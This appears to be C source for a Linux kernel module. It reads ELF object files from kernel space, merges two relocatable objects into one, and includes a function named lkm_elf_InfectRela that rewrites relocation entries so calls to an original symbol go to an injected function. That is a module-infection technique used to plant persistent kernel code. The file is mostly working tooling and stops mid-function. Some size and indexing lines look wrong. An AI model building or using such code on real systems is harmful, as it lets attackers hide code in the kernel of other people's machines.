#include <linux/init.h> 
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/elf.h>

#include "lkm_file.c"

struct lkm_elf_struct {
	struct file *fd;
	char	   *name;
	char       class;
	short	   type;
	long	   file_size;
	void	   *shtab;
	void	   *strtab;
	void	   *symtab;
	int	   *sym_comm;
	void	   *shstrtab;
	int	   *sect_comm;
	int	   strtab_len;
	int	   symtab_len;
	int	   shtab_len;
	int	   shstrtab_len;
	int	   sym_sz;
	Elf64_Ehdr head;
};

int lkm_elf_InfectRela(struct lkm_elf_struct *elf, char *sec_name, char *sym_orig, char *sym_inj); 
int lkm_elf_shtab(struct lkm_elf_struct *elf); 
int lkm_elf_strtab(struct lkm_elf_struct *elf); 
int lkm_elf_symtab(struct lkm_elf_struct *elf); 
int lkm_elf_shstrtab(struct lkm_elf_struct *elf);
void lkm_elf_close(struct lkm_elf_struct *elf); 
struct lkm_elf_struct *lkm_elf_init(char *path); 
int lkm_elf_GetSectionName(struct lkm_elf_struct *elf, Elf64_Word sh_name, char *res, size_t len); 
int lkm_elf_SectByName(struct lkm_elf_struct *elf, char *name, Elf64_Shdr *shdr); 
void *lkm_elf_SectRead(struct lkm_elf_struct *elf, Elf64_Shdr *shdr, int *size); 
int lkm_elf_SectByIndx(struct lkm_elf_struct *elf, int indx, Elf64_Shdr *shdr); 
int lkm_elf_SymByName(struct lkm_elf_struct *elf, char *name, Elf64_Sym *sym); 
int lkm_elf_GetSymbolName(struct lkm_elf_struct *elf, Elf64_Word sh_name, char *res, size_t len); 
int lkm_elf_SymComm(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3); 
int lkm_elf_SymCommFind(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3); 
int lkm_elf_SectCommFind(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3); 
int lkm_elf_SectComm(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3); 
int lkm_elf_SectCheckComm(struct lkm_elf_struct *elf, int indx_sh); 
int lkm_elf_SymCheckComm(struct lkm_elf_struct *elf, int indx_sym);
int lkm_elf_MakeFile(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, char *fname); 
int lkm_elf_WriteFile(struct lkm_elf_struct *elf, void **buf, char *fname); 
int lkm_elf_SectResolvRel(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, Elf64_Shdr *sec3, void *data);
int lkm_elf_SectResolv(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, void **buf); 
int lkm_elf_SymResolv(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3); 
long lkm_elf_MakeHead(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf3);
void *lkm_elf_SectMake(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, int indx, int *size); 
void *lkm_elf_SectExpand(struct lkm_elf_struct *elf1, Elf64_Shdr *sh1, struct lkm_elf_struct *elf2, Elf64_Shdr *sh2, int *size); 
int lkm_elf_RelResolv(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, void **buf); 
int lkm_elf_MakeRel(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, Elf64_Shdr *sec3_rel, void *data, int indx, int flag); 

//////////////////////////////////////// DEBUG //////////////////////////////////////////////////////////////////////////////////////////////////////////
int lkm_elf_SectDump(struct lkm_elf_struct *elf); 
int lkm_elf_SymDump(struct lkm_elf_struct *elf); 
int test(void);

char *sectypes[] = { "SHT_NULL", "SHT_PROGBITS", "SHT_SYMTAB", "SHT_STRTAB", "SHT_RELA", "SHT_HASH", "SHT_DYNAMIC", "SHT_NOTE", "SHT_NOBITS", "SHT_REL", "SHT_SHLIB", "SHT_DYNSYM", "SHT_INIT_ARRAY", "SHT_FINI_ARRAY"};
char *systypes[] = { "STT_NOTYPE", "STT_OBJECT", "STT_FUNC", "STT_SECTION", "STT_FILE", "STT_COMMON", "STT_TLS", "STT_NUM", "STT_LOOS", "STT_GNU_IFUNC", "STT_HIOS", "STT_LOPROC", "STT_HIPROC"};

int lkm_elf_SectDump(struct lkm_elf_struct *elf) {
	if(!elf || !elf->shtab || !elf->shstrtab) return -1;

	char sect[255];
	Elf64_Shdr *shdr;
	long allsz = 0;
	int cnt = 0;
	for(int i=0; i<elf->shtab_len; i+=sizeof(Elf64_Shdr)) {
		shdr = (void*)( (char*)elf->shtab+i);
		Elf64_Word type = shdr->sh_type;
		lkm_elf_GetSectionName(elf, shdr->sh_name, sect, sizeof (sect));
		printk(KERN_INFO "[%d]	%s	|offs:0x%lx|sz(%ld)|name[%hd]:	%s\n", cnt, sectypes[type], (long)shdr->sh_offset, (long)shdr->sh_size, shdr->sh_name, sect);
		cnt++;
		allsz += shdr->sh_size;
	}
	printk(KERN_INFO "---------------- all sections in file size(%ld) -----------\n", allsz);
	return 0;
}

int lkm_elf_SymDump(struct lkm_elf_struct *elf) {
	if(!elf || !elf->symtab || !elf->strtab) return -1;

	int a;
	char symb[255];
	Elf64_Sym *sym;
	Elf64_Shdr *sec;
	int cnt = 0;
	for(int i=0; i<elf->symtab_len; i+=sizeof(Elf64_Sym)) {
		sym = (void*)( (char*)elf->symtab+i);
		char type = sym->st_info & 0xF;
		if(type==STT_SECTION) {
			if(elf->shtab) {
				sec = elf->shtab+(sym->st_shndx*sizeof(Elf64_Shdr));
				a = lkm_elf_GetSectionName(elf, sec->sh_name, symb, sizeof(symb));
			}
		} else {
	 		a = lkm_elf_GetSymbolName(elf, sym->st_name, symb, sizeof(symb));	
		}
		if(a) continue;
		printk(KERN_INFO "Sym(%d):	%s	|(%hhd) %s\n", cnt, symb, type, systypes[(int)type]);
		cnt++;
	}
	return 0;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int lkm_elf_InfectRela(struct lkm_elf_struct *elf, char *sec_name, char *sym_orig, char *sym_inj) {
	if(!elf || !sec_name || !sym_orig || !sym_inj) return -1;
	if(!elf->fd || !elf->shtab || !elf->symtab) return -1;

	int ret = -1;
	int size; 
	long b;
	char type;
	void *buf;
	Elf64_Shdr *sec;
	Elf64_Sym *s_inj;
	struct file *fd = elf->fd;

	int i_sec = lkm_elf_SectByName(elf, sec_name, NULL);
	if(i_sec <=0) return -1;

	int i_inj = lkm_elf_SymByName(elf, sym_inj, NULL);
	if(i_inj <=0) return -1;
	
	int i_orig = lkm_elf_SymByName(elf, sym_orig, NULL);
	if(i_orig <=0) return -1;

	s_inj = elf->symtab+(i_inj*sizeof(Elf64_Sym));
	type = s_inj->st_info & 0xF;
	if(type!=STT_FUNC) return -1; 

	sec = elf->shtab+(i_sec*sizeof(Elf64_Shdr));
	if(sec->sh_type!= SHT_RELA) return -1;

	buf = lkm_elf_SectRead(elf, sec, &size);	
	if(size!=sec->sh_size) goto end;

	for(int i=0; i<sec->sh_size; i+=sizeof(Elf64_Rela)) {
		Elf64_Rela *rel = buf+i;
		if(rel->r_info>>32==i_orig) {
			b = i_inj;
			rel->r_info = (b<<32)+(rel->r_info & 0xFFFFFFFF);
		}

	}

	fd->f_pos = sec->sh_offset;
	if(lkm_file_write(fd, buf, sec->sh_size, &fd->f_pos)==-1) goto end;
	ret = 0;
end:
	kfree(buf);
	return ret;
}
int lkm_elf_SymCheckComm(struct lkm_elf_struct *elf, int indx_sym) {
	if(!elf || !elf->sym_comm) return -1;

	int i, a;
	for(i=0; i<(elf->symtab_len/sizeof(Elf64_Sym)); i++) {
		a = (int)elf->sym_comm[i];
		if(a==indx_sym) return i;
	}
	return -1;
}
int lkm_elf_SectCheckComm(struct lkm_elf_struct *elf, int indx_sh) {
	if(!elf || !elf->sect_comm) return -1;

	int i, a;
	for(i=0; i<(elf->shtab_len/sizeof(Elf64_Shdr)); i++) {
		a = (int)elf->sect_comm[i];
		if(a==indx_sh) return i;
	}
	return -1;
}
void *lkm_elf_SectExpand(struct lkm_elf_struct *elf1, Elf64_Shdr *sh1, struct lkm_elf_struct *elf2, Elf64_Shdr *sh2, int *size) {
	if(!sh1 || !sh2 || !elf1 || !elf2 || !size) return NULL;

	void *sect;
	int sz1 = sh1->sh_size;
       	int sz2 = sh2->sh_size;
	int sz = sz1 + sz2;
	void *ret = kmalloc(sz, GFP_KERNEL);
	if(!ret) goto out;

	if(!sz1) goto read2;
	sect = lkm_elf_SectRead(elf1, sh1, &sz1); if(!sect) goto err; 
	if(sz1!=sh1->sh_size) goto err1;
	memcpy(ret, sect, sz1);
	kfree(sect);
read2:
	sect = lkm_elf_SectRead(elf2, sh2, &sz2);
	if(!sect) goto err; 
	if(sz2!=sh2->sh_size) goto err1;
	memcpy(ret+sz1, sect, sz2);
	kfree(sect);

	*size = (int)sz;
	return ret;
err1:
	kfree(sect);
err:
	kfree(ret);
out:
	*size = 0;
	return NULL;
}
void *lkm_elf_SectMake(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, int indx, int *size) {

	void *sec_map = NULL;
	Elf64_Shdr *sec2 = NULL;
	Elf64_Shdr *sec1 = NULL;
	Elf64_Shdr *sec3 = elf3->shtab+(indx*sizeof(Elf64_Shdr));

	//printk(KERN_INFO "----------- IN SECTMAKE(%d)\n", indx);
	if(indx<elf1->shtab_len/sizeof(Elf64_Shdr)) {
		sec1 = elf1->shtab+(indx*sizeof(Elf64_Shdr));
		int a = lkm_elf_SectCheckComm(elf3, indx);
		if(a>=0) { //common
			sec2 = elf2->shtab+(a*sizeof(Elf64_Shdr));
			sec_map = lkm_elf_SectExpand(elf1, sec1, elf2, sec2, size);
		}
		else {
			sec_map = lkm_elf_SectRead(elf1, sec1, size);	
		}
		goto out;
	}
	sec2 = sec3;
	sec_map = lkm_elf_SectRead(elf2, sec2, size);
out:
	return sec_map;
}

int lkm_elf_MakeRel(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, Elf64_Shdr *sec3_rel, void *data, int indx, int flag) {
	if(!elf1 || !elf2 || !elf3 || !sec3_rel || !data) return -1;
	if(!elf2->symtab || !elf2->strtab || !elf3->shstrtab) return -1;
	
	int i = 0;
	int c = 0;
	long b;
	Elf64_Shdr sec1, sec1_rel;
	Elf64_Word type = sec3_rel->sh_type;
	char *name = elf3->shstrtab+sec3_rel->sh_name;
	char *patt = NULL;
	char *sub = NULL;
	int patt_len, st_len, a;
	struct lkm_elf_struct *elf_t = elf2;
//printk(KERN_INFO "	IN MAKE REL: %s [%d]  \n", name, flag);

	if( (!flag) && (indx<elf1->shtab_len/sizeof(Elf64_Shdr)) ) elf_t = elf1;
	if(type==SHT_RELA) { 
		st_len = sizeof(Elf64_Rela);
		patt_len = 5;
		patt = ".rela";
	}
	else if(type==SHT_REL){
		st_len = sizeof(Elf64_Rel);
		patt_len = 4;
	       	patt = ".rel";
	}
	else return -1;

	sub = strstr(name, patt);
	if(sub!=name) return -1;
	sub = name+patt_len;
	if(sub[0]=='a') return -1;

	if(flag>0) {
		a = lkm_elf_SectByName(elf1, name+strlen(patt), &sec1);
		if(a<=0) return -1;
		a = lkm_elf_SectByName(elf1, name, &sec1_rel);
		if(a<=0) return -1;
		i=sec1_rel.sh_size;
		c = sec1.sh_size;
	}

	Elf64_Rel *rel;
	Elf64_Sym *sym;
	int sym_i;
	char t;
	//printk(KERN_INFO "					%s	==== %s || sz1[%d] sz3[%d] \n", name, sub, i, sec3_rel->sh_size);
	for(; i<sec3_rel->sh_size; i+=st_len) {
		rel = data+i;
		sym_i = rel->r_info>>32;
		sym = elf_t->symtab+(sym_i*sizeof(Elf64_Sym));
		t = (char)(sym->st_info & 0xF);

		if(t==STT_SECTION) {
			lkm_elf_SectByIndx(elf_t, sym->st_shndx, &sec1);
			name = elf_t->shstrtab+sec1.sh_name;
		}
		else {
			name = elf_t->strtab+sym->st_name;
		}

		b = (long)lkm_elf_SymByName(elf3, name, NULL);
		if(b<=0) return -1;

		rel->r_info = (b<<32)+(rel->r_info & 0xFFFFFFFF);
		rel->r_offset += c;
	}
	return 0;
}

int lkm_elf_RelResolv(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, void **buf) {
	if(!elf1 || !elf2 || !elf3 || !buf) return -1;
	if(!elf1->shtab || !elf2->shtab || !elf3->shtab) return -1;
	if(!elf3->sect_comm) return -1;

	int i, a, flag;
	Elf64_Shdr *sec3;
	Elf64_Word type;

	for(i = 0; i<elf3->shtab_len/sizeof(Elf64_Shdr); i++) {
		sec3 = elf3->shtab+(i*sizeof(Elf64_Shdr));
		type = sec3->sh_type;
		if(type!=SHT_RELA && type!=SHT_REL) continue; 

		flag = 0;
		if(i<elf1->shtab_len/sizeof(Elf64_Shdr)) {
			a = lkm_elf_SectCheckComm(elf3, i);
			if(a>0)/*common*/ flag = 1;
		}
		a = lkm_elf_MakeRel(elf1, elf2, elf3, sec3, buf[i], i, flag); 
	}
	return 0;
}
int lkm_elf_SectResolv(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3, void **buf) {
	if(!elf1 || !elf2 || !elf3 || !buf) return -1;
	if(!elf1->shtab || !elf2->shtab || !elf3->shtab) return -1;
	if(!elf3->sect_comm) return -1;

	int i, a;
	void *sec_map;
	Elf64_Shdr *sec3;

	for(i=0; i<(elf3->shtab_len/sizeof(Elf64_Shdr)); i++) {
		
		sec3 = elf3->shtab+(i*sizeof(Elf64_Shdr));
		sec_map = lkm_elf_SectMake(elf1, elf2, elf3, i, &a);
		sec3->sh_size = a;
		buf[i] = sec_map;
	}
	return 0;
}

int lkm_elf_SymResolv(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3) {
	if(!elf1 || !elf2 || !elf3) return -1;
	if(!elf1->symtab || !elf2->symtab || !elf3->symtab) return -1;
	if(!elf3->sym_comm) return -1;

	char type;
	int i, a;
	Elf64_Shdr sec1, sec2;
	Elf64_Sym *sym3;

	for(i=elf1->symtab_len/sizeof(Elf64_Sym); i<(elf3->symtab_len/sizeof(Elf64_Sym)); i++) {
			 //NO common Symbol
		sym3 = elf3->symtab+(i*sizeof(Elf64_Sym));
		type = sym3->st_info & 0xF;
		if((type==STT_FILE) || (type==STT_NOTYPE)) continue;

		a = lkm_elf_SectByIndx(elf2, sym3->st_shndx, &sec2);
		if(a<0) return -1;
		a = lkm_elf_SectByName(elf3, elf2->shstrtab+sec2.sh_name, NULL);	
		if(a<0) return -1;
		sym3->st_shndx = a;

		if(type==STT_SECTION) continue; 
			
		a = lkm_elf_SectCheckComm(elf3, sym3->st_shndx);
		if(a>0) { //common Section
			a = lkm_elf_SectByName(elf1, elf2->shstrtab+sec2.sh_name, &sec1);
			if(a<0) return -1;
			sym3->st_value += sec1.sh_size;
		}
	}
	return 0;
}	 
long lkm_elf_MakeHead(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf3) {
	
	Elf64_Shdr *sect;

	int i, str_i, tmp;
	int sym_i = lkm_elf_SectByName(elf3, ".symtab", NULL);
	if(sym_i<=0) return 0;
	long fsize = sizeof(Elf64_Ehdr);
	memcpy(&elf3->head, &elf1->head, sizeof(Elf64_Ehdr));
	
	for(i=1; i<elf3->shtab_len/sizeof(Elf64_Shdr); i++) {
		sect = elf3->shtab+(i*sizeof(Elf64_Shdr));
		sect->sh_offset = fsize;
		if(sect->sh_type==SHT_STRTAB) {

			if(!strcmp(elf3->shstrtab+sect->sh_name, ".shstrtab")) {
				elf3->head.e_shstrndx = i;
				sect->sh_size = elf3->shstrtab_len;
			}
			else if(!strcmp(elf3->shstrtab+sect->sh_name, ".strtab")) {
				str_i = i;
				sect->sh_size = elf3->shtab_len;
			}
		}
		else if(sect->sh_type==SHT_SYMTAB) {
			if(!strcmp(elf3->shstrtab+sect->sh_name, ".symtab")) {
				sect->sh_size = elf3->symtab_len;
				sect->sh_info = elf3->symtab_len/sizeof(Elf64_Sym);
			}
		}
		else if(sect->sh_type==SHT_RELA || sect->sh_type==SHT_REL) {
			int patt_len;
			sect->sh_link = sym_i;
			if(sect->sh_type==SHT_REL ) {
				patt_len = strlen(".rel");

			}
			else {
				patt_len = strlen(".rela");

			}
			tmp = lkm_elf_SectByName(elf3, elf3->shstrtab+sect->sh_name+patt_len, NULL);
			if(tmp<=0) return 0;
			sect->sh_info = tmp;
		}
		fsize += sect->sh_size;
	}

	sect = elf3->shtab+(sym_i*sizeof(Elf64_Ehdr));
	sect->sh_link = str_i;
	elf3->head.e_shnum = i;
	elf3->head.e_shoff = fsize;
	return fsize;
}
int lkm_elf_WriteFile(struct lkm_elf_struct *elf, void **buf, char *fname) {

	int i;
	Elf64_Shdr *sec;
	loff_t *offs;
	struct file *fd = filp_open(fname, O_RDWR|O_APPEND|O_CREAT, 0600);

    	if(!fd) return -1;
	fd->f_pos = 0;
	offs = &fd->f_pos;
	if(lkm_file_write(fd, &elf->head, sizeof(Elf64_Ehdr), &fd->f_pos)==-1) goto err;

	for(i=1; i<elf->head.e_shnum; i++) {
		sec = elf->shtab+(i*sizeof(Elf64_Shdr));
		//printk(KERN_INFO "--- [%d] sz[%d] 0x%lx,  %s\n", i, sec->sh_size, sec->sh_offset, elf->shstrtab+sec->sh_name);
		if(!buf[i]) continue;

		if(sec->sh_type==SHT_STRTAB) {
			if(!strcmp(elf->shstrtab+sec->sh_name, ".shstrtab")) {

				if(lkm_file_write(fd, elf->shstrtab, sec->sh_size, NULL)==-1) goto err;
			}
			else if(!strcmp(elf->shstrtab+sec->sh_name, ".strtab")) {

				if(lkm_file_write(fd, elf->strtab, sec->sh_size, NULL)==-1) goto err;
			}
		}
		else if(sec->sh_type==SHT_SYMTAB) {

				if(lkm_file_write(fd, elf->symtab, sec->sh_size, NULL)==-1) goto err;
		}
		else {

			if(lkm_file_write(fd, buf[i], sec->sh_size, NULL)==-1) goto err;
		}
	}

	lkm_file_write(fd, elf->shtab, elf->shtab_len, NULL);
err:
	lkm_file_close(fd);
	return 0;
}
int lkm_elf_MakeFile(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, char *fname) {
	
	int a;
	struct lkm_elf_struct *elf3 = kmalloc(sizeof(struct lkm_elf_struct), GFP_KERNEL);
	if(!elf3) return -1;
	memset(elf3, 0, sizeof(struct lkm_elf_struct));
	memcpy(&elf3->head, &elf1->head, sizeof(Elf64_Ehdr));

	lkm_elf_SymComm(elf1, elf2, elf3);
	lkm_elf_SectComm(elf1, elf2, elf3);

	void **resolv_sects = kmalloc((elf3->shtab_len/sizeof(Elf64_Shdr)+1)*sizeof(long), GFP_KERNEL);
	if(!resolv_sects) goto err;
	memset(resolv_sects, 0,  (elf3->shtab_len/sizeof(Elf64_Shdr)+1)*sizeof(long));
	
	a = lkm_elf_SymResolv(elf1, elf2, elf3);
	if(a==-1) {printk(KERN_INFO "DONE: Resolv Symbols\n"); goto err1;}

	a = lkm_elf_SectResolv(elf1, elf2, elf3, resolv_sects);
	if(a==-1) {printk(KERN_INFO "DONE: Resolv Sects: %ld\n", elf3->shtab_len/sizeof(Elf64_Shdr)); goto err1;}

	a = lkm_elf_RelResolv(elf1, elf2, elf3, resolv_sects);
	if(a==-1) {printk(KERN_INFO "DONE: Resolv REL\n"); goto err1;}

	a = lkm_elf_MakeHead(elf1, elf3);
	if(a<=0) goto err1;

	lkm_elf_WriteFile(elf3, resolv_sects, fname);	

err1:
	if(resolv_sects) {
		for(int e=0; e<elf3->shtab_len/sizeof(Elf64_Shdr)+1; e++) {
			void *ea = resolv_sects[e];
			if(!ea) continue;
			kfree(ea);
		}
		kfree(resolv_sects);
	}
err:
	//lkm_elf_SymDump(elf3);
	//lkm_elf_SectDump(elf3);
	lkm_elf_close(elf3);
	return 0;
}

int lkm_elf_SymComm(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3) {
	void *fsymtab = NULL;
	void *fstrtab = NULL;

	int slen1 = elf1->symtab_len;
	int slen2 = elf2->symtab_len;
	int flen = slen1+slen2; 
	fsymtab = kmalloc((slen1+slen2+4)*1, GFP_KERNEL);
	if(!fsymtab) return -1;

	int fstrlen = elf1->strtab_len+elf2->strtab_len+4;
	fstrtab = kmalloc(fstrlen*1, GFP_KERNEL);
	if(!fstrtab) { kfree(fsymtab); return -1;} 

	memset(fstrtab, 0, fstrlen);
	memset(fsymtab, 0, flen);
	memcpy(fsymtab, elf1->symtab, slen1);
	memcpy(fstrtab, elf1->strtab, elf1->strtab_len);
	lkm_elf_SymCommFind(elf1, elf2, elf3);
	if(!elf3->sym_comm) { kfree(fsymtab); kfree(fstrtab); return -1;} 

	elf3->strtab = fstrtab;
	elf3->symtab = fsymtab;

	char *str2, *str3;
	int i1, i2, a;
	int fi = slen1;
	int fsi = elf1->strtab_len;
	for(i2=0; i2<(elf2->symtab_len/sizeof(Elf64_Sym)); i2++) {
		i1 = (int)elf3->sym_comm[i2];
		if(i1!=0) continue;

		Elf64_Sym *sym2 = elf2->symtab+(i2*sizeof(Elf64_Sym)); 
		Elf64_Sym *sym3 = fsymtab+fi;
		if(sym2->st_info == 0) continue;

		a = 0;
		memcpy(sym3, sym2, sizeof(Elf64_Sym)); 

		if((sym2->st_info & 0xF)!=STT_SECTION) { 

			str2 = elf2->strtab+sym2->st_name;
			str3 = fstrtab+fsi;
			a = strlen(str2)+1;
			memcpy(str3, str2, a);
			sym3->st_name = (Elf64_Word)fsi;
		}

		fsi += a; 
		fi += sizeof(Elf64_Sym);
	}
	elf3->symtab_len = fi;
	elf3->strtab_len = fsi;
	return 0;
}
int lkm_elf_SymCommFind(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3) {
	if(!elf1 || !elf2 || !elf3) return -1;
	if(!elf1->strtab || !elf2->strtab) return -1;
	if(!elf1->symtab || !elf2->symtab) return -1;

	Elf64_Sym *sym2; 
	char sname2[255];
	
	int a = (elf2->symtab_len/sizeof(Elf64_Sym))*(sizeof(int)*2)+8;
	if(elf3->sym_comm) return -1;
	elf3->sym_comm = kmalloc(a, GFP_KERNEL);
	if(!elf3->sym_comm) return -1;

	int *sym_comm = elf3->sym_comm;
	memset(sym_comm, 0, a);

	a = 0;
	int indx2 = -1;
	int indx1 = 0;
	for (int i=0; i<elf2->symtab_len; i+=sizeof(Elf64_Sym)) {
		indx2++;
		sym2 = (void*)( (char*)elf2->symtab+i);	

		char type = sym2->st_info & 0xF;
		if(type==STT_SECTION) {

			Elf64_Shdr *sec2 = elf2->shtab+(sym2->st_shndx*sizeof(Elf64_Shdr));
			lkm_elf_GetSectionName(elf2, sec2->sh_name, sname2, sizeof(sname2));
			indx1 = lkm_elf_SymByName(elf1, sname2, NULL);
			} 
		else {
			lkm_elf_GetSymbolName(elf2, sym2->st_name, sname2, sizeof(sname2));
			indx1 = lkm_elf_SymByName(elf1, sname2, NULL);
		} 
		if (indx1>0) {
			elf3->sym_comm[indx2] = indx1;
			a++;
		}	
	}
	sym_comm[indx2+1] = -1;
	elf3->symtab_len = elf2->symtab_len;
	return 0;
}
int lkm_elf_SectCommFind(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3) {
	if(!elf1 || !elf2 || !elf3) return -1;
	if(!elf1->shstrtab || !elf2->shstrtab) return -1;
	if(!elf1->shtab || !elf2->shtab) return -1;

	Elf64_Shdr sec1; 
	Elf64_Shdr *sec2; 
	char sname2[255];
	
	int a = (elf2->shtab_len/sizeof(Elf64_Shdr))*(sizeof(int)*2)+8;
	if(elf3->sect_comm) return -1;
	elf3->sect_comm = kmalloc(a, GFP_KERNEL);
	if(!elf3->sect_comm) return -1;

	int *sect_comm = elf3->sect_comm;
	memset(sect_comm, 0, a);
	
	a = 0;
	int indx2 = -1;
	int indx1 = 0;
	for (int i=0; i<elf2->shtab_len; i+=sizeof(Elf64_Shdr)) {
		indx2++;
		sec2 = (void*)( (char*)elf2->shtab+i);	
		memset(sname2, 0, sizeof(sname2));
		lkm_elf_GetSectionName(elf2, sec2->sh_name, sname2, sizeof(sname2));
		indx1 = lkm_elf_SectByName(elf1, sname2, &sec1);

		if (indx1>0) {
			elf3->sect_comm[indx2] = indx1;
			a++;
		}	
	}
	sect_comm[indx2+1] = -1;
	elf3->shtab_len = elf2->shtab_len;
	return 0;
}

int lkm_elf_SectComm(struct lkm_elf_struct *elf1, struct lkm_elf_struct *elf2, struct lkm_elf_struct *elf3) {
	void *fsectab = NULL;
	void *fstrtab = NULL;

	int slen1 = elf1->shtab_len;
	int slen2 = elf2->shtab_len;
	int flen = slen1+slen2; 
	fsectab = kmalloc((slen1+slen2+4)*2, GFP_KERNEL);
	if(!fsectab) return -1;

	int fstrlen = elf1->shstrtab_len+elf2->shstrtab_len+4;
	fstrtab = kmalloc(fstrlen*2, GFP_KERNEL);
	if(!fstrtab) { kfree(fsectab); return -1; }

	memset(fstrtab, 0, fstrlen);
	memset(fsectab, 0, flen);
	memcpy(fsectab, elf1->shtab, slen1);
	memcpy(fstrtab, elf1->shstrtab, elf1->shstrtab_len);
	lkm_elf_SectCommFind(elf1, elf2, elf3);
	if(!elf3->sect_comm) { kfree(fsectab); kfree(fstrtab); return -1; }

	elf3->shstrtab = fstrtab;
	elf3->shtab = fsectab;

	char *str2, *str3;
	int i1, i2, a;
	int fi = slen1;
	int fsi = elf1->shstrtab_len;
	for(i2=1; i2<(elf2->shtab_len/sizeof(Elf64_Shdr)); i2++) {
		i1 = (int)elf3->sect_comm[i2];
		Elf64_Shdr *sec2 = elf2->shtab+(i2*sizeof(Elf64_Shdr)); 
		if(i1!=0) continue;

		Elf64_Shdr *sec3 = fsectab+fi;
		str2 = elf2->shstrtab+sec2->sh_name;
		str3 = fstrtab+fsi;
		a = strlen(str2)+1;
		memcpy(str3, str2, a);
		memcpy(sec3, sec2, sizeof(Elf64_Shdr)); 
		sec3->sh_name = (Elf64_Word)fsi;

		fsi += a; 
		fi += sizeof(Elf64_Shdr);
		
	}

	elf3->shtab_len = fi;
	elf3->shstrtab_len = fsi;
	return 0;
}
void *lkm_elf_SectRead(struct lkm_elf_struct *elf, Elf64_Shdr *shdr, int *size) {
	if(!elf || !shdr || !size ||!elf->fd ) return NULL;

	void *buf = NULL;
	struct file *fd = elf->fd;
	Elf64_Xword sz = shdr->sh_size;
	if(!sz) return NULL;

	buf = kmalloc(sz+8, GFP_KERNEL);
	if(!buf) return NULL;

	fd->f_pos = shdr->sh_offset;
	if(lkm_file_read(fd, buf, sz, &fd->f_pos) != sz) {
		kfree(buf);
		return NULL;
	}
	*size = (int)sz; 
	return buf;
}
int lkm_elf_GetSectionName(struct lkm_elf_struct *elf, Elf64_Word sh_name, char *res, size_t len) {
	if(!elf || !elf->shstrtab) return 0;

	char *shstrtab = elf->shstrtab+sh_name;
	int i = 0;
	while(i < len) {
		*res =  shstrtab[i];
		if(*res == '\0')break;
		i++;
		res++;
	}
	return 0;
}
int lkm_elf_SectByName(struct lkm_elf_struct *elf, char *name, Elf64_Shdr *shdr) {
	if(!elf || !elf->shtab || !elf->shstrtab) return 0;

	Elf64_Shdr *shtab = elf->shtab;
	Elf64_Shdr *sec;
	char secn[255];

	int cnt= 0;
	for (int i=0; i<elf->shtab_len; i+=sizeof(Elf64_Shdr)) {
		sec = (void*)( (char*)shtab+i);	
		memset(secn, 0, sizeof(secn));
		lkm_elf_GetSectionName(elf, sec->sh_name, secn, sizeof(secn));
		if (!strcmp (secn, name)) { 
			if(!shdr) return cnt;
		       	memcpy(shdr, sec, sizeof(Elf64_Shdr)); 
			return cnt;
	       	}
		cnt++;
	}
	return -1;
}
int lkm_elf_SectByIndx(struct lkm_elf_struct *elf, int indx, Elf64_Shdr *shdr) {
	if(!elf || !shdr || !elf->fd) return -1;
	struct file *fd = elf->fd;

	fd->f_pos = elf->head.e_shoff + (indx * elf->head.e_shentsize);
	if(lkm_file_read(fd, shdr, sizeof(Elf64_Shdr), &fd->f_pos) != sizeof(Elf64_Shdr)) return -1;
	return 0;
}
int lkm_elf_shstrtab(struct lkm_elf_struct *elf) {
	if(!elf) return -1;
	Elf64_Shdr shstrtable;

	if(lkm_elf_SectByIndx(elf, elf->head.e_shstrndx, &shstrtable) == -1) return -1;
	elf->shstrtab = lkm_elf_SectRead(elf, &shstrtable, &elf->shstrtab_len);
	if(!elf->shstrtab) return -1;
	return 0;
}
int lkm_elf_GetSymbolName(struct lkm_elf_struct *elf, Elf64_Word st_name, char *res, size_t len) {
	if(!elf ||!elf->strtab) return 0;

	char *strtab = elf->strtab+st_name;
	int i = 0;
	while (i < len) {
		*res =  strtab[i];
		if(*res == '\0')break;
		i++;
		res++;
	  }
	  return 0;
}
int lkm_elf_SymByName(struct lkm_elf_struct *elf, char *name, Elf64_Sym *rsym) {
	if(!elf || !elf->symtab || !elf->strtab) return 0;

	Elf64_Sym *symtab = elf->symtab;
	Elf64_Sym *sym;
	Elf64_Shdr *sec;
	char symb[255];

	int cnt= 0;
	for (int i=0; i<elf->symtab_len; i+=sizeof(Elf64_Sym)) {
		sym = (void*)( (char*)symtab+i);	
		memset(symb, 0, sizeof(symb));
		if((sym->st_info & 0xF)==STT_SECTION) {
			if(!elf->shtab) continue;
			sec = elf->shtab+(sym->st_shndx*sizeof(Elf64_Shdr));
			lkm_elf_GetSectionName(elf, sec->sh_name, symb, sizeof(symb));
		}
		else {lkm_elf_GetSymbolName(elf, sym->st_name, symb, sizeof(symb));} 
		if (!strcmp (symb, name)) { 
